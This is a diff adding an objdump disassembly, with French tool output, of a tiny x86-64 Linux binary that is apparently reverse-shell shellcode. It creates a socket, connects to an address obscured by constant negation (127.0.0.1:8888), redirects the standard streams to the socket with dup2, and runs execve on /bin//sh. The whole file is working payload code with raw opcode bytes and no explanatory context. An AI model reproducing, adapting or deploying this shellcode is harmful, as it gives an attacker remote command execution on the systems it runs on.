@@ -1,0 +1,48 @@
+
+a.out:     format de fichier elf64-x86-64
+
+
+Déassemblage de la section .text :
+
+0000000000401000 <_start>:
+  401000:	6a 29                	pushq  $0x29
+  401002:	58                   	pop    %rax
+  401003:	99                   	cltd   
+  401004:	6a 02                	pushq  $0x2
+  401006:	5f                   	pop    %rdi
+  401007:	6a 01                	pushq  $0x1
+  401009:	5e                   	pop    %rsi
+  40100a:	0f 05                	syscall 
+
+000000000040100c <connect>:
+  40100c:	97                   	xchg   %eax,%edi
+  40100d:	b0 2a                	mov    $0x2a,%al
+  40100f:	48 b9 fe ff dd 47 80 	movabs $0xfeffff8047ddfffe,%rcx
+  401016:	ff ff fe 
+  401019:	48 f7 d9             	neg    %rcx
+  40101c:	51                   	push   %rcx
+  40101d:	54                   	push   %rsp
+  40101e:	5e                   	pop    %rsi
+  40101f:	b2 10                	mov    $0x10,%dl
+  401021:	0f 05                	syscall 
+
+0000000000401023 <dup2>:
+  401023:	6a 03                	pushq  $0x3
+  401025:	5e                   	pop    %rsi
+
+0000000000401026 <dup2_loop>:
+  401026:	b0 21                	mov    $0x21,%al
+  401028:	ff ce                	dec    %esi
+  40102a:	0f 05                	syscall 
+  40102c:	75 f8                	jne    401026 <dup2_loop>
+
+000000000040102e <execve>:
+  40102e:	99                   	cltd   
+  40102f:	b0 3b                	mov    $0x3b,%al
+  401031:	52                   	push   %rdx
+  401032:	48 b9 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rcx
+  401039:	2f 73 68 
+  40103c:	51                   	push   %rcx
+  40103d:	54                   	push   %rsp
+  40103e:	5f                   	pop    %rdi
+  40103f:	0f 05                	syscall 
